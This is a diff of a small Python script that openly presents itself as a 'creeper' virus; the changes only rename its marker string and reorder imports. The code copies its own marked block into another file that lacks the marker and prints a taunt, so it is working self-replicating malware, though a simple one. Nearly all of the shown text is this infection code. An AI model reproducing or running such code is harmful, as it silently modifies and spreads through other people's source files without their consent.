@@ -9,14 +9,14 @@ print("Some Code")
 print("Some Code")
 print("Some Code\n")
 
-# ========I'm creeper:========
-import os
+# ========I'm the creeper:========
 import sys
+import os
 
 with open(sys.argv[0], "r") as file:
     replicate = file.readlines()
     pos = [i for (i, line) in enumerate(replicate)
-           if "I'm creeper" in line or "Catch me if you can" in line]
+           if "I'm the creeper" in line or "Catch me if you can" in line]
     replicate = replicate[pos[0]:pos[-1] + 1]
 
 
@@ -30,7 +30,7 @@ def find(pattern, path):
                 # print(copyFile)
 
                 notInfected = not list(
-                    filter(lambda line: "I'm creeper" in line, copyFile))
+                    filter(lambda line: "I'm the creeper" in line, copyFile))
                 # notInfected = not [line for line in copyFile if ("I'm creeper" in line)]
 
                 if notInfected:
@@ -45,7 +45,7 @@ else:
 print("Path -- ", path)
 
 if path:
-    print("I'm creeper, catch me if you can")
+    print("I'm the creeper, catch me if you can")
     copyFile.extend(replicate)
     with open(path, "w") as file:
         file.writelines(copyFile)
